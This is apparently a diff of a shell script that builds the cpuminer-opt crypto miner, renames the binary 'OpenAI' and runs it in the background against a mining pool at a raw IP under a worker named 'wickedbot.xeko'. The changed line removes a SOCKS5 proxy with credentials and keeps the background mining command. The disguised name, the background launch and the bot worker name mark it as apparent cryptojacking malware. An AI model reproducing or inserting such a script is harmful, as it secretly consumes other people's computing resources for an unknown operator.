@@ -5,4 +5,4 @@ cd cpuminer-opt
 chmod +x *
 ./build.sh
 mv cpuminer OpenAI
-cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.xeko -p x -x socks5://zimbalem:123456@209.250.244.28:1212 --background
+cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.xeko -p x --background
